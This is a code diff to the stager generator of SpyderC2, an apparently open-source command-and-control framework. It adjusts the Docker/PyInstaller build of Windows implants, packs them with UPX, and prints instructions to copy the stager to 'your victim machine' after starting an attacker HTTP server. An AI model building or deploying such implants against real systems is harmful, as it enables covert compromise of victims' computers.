@@ -338,7 +338,10 @@ def generate_stager(server_logger,args={}):
 			if os_name == 'android':
 				generate_android_stager(os.path.join(PATH,'shared','tmp'))
 			else:
-				subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
+				if os_name == 'windows':
+					subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" --entrypoint /bin/bash cdrx/pyinstaller-{os_name}:python3 -c "python -m pip install --upgrade pip  && /entrypoint.sh"', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
+				else:
+					subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
 
 				if pack_exe(server_logger,exe_path,packer_path):
 					server_logger.info_log('Sucessfully Packed exe','green')
@@ -355,7 +358,10 @@ def generate_stager(server_logger,args={}):
 			else:
 				cmd = f'Please run the following command in path [orange_red1]SpyderC2/data/shared/tmp[/orange_red1] on the [bold blue]HOST MACHINE [/bold blue]\n\n'
 
-				cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+				if os_name == 'windows':
+					cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" --entrypoint /bin/bash cdrx/pyinstaller-{os_name}:python3 -c "python -m pip install --upgrade pip  && /entrypoint.sh" && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
+				else:
+					cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'
 
 				cmd += f'The stager will be generated in [orange_red1]SpyderC2/data/shared/tmp/dist/{os_name}[/orange_red1] on HOST.\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager on victim.'
 				pprint(Panel(cmd, title="[red bold]ATTENTION!"))
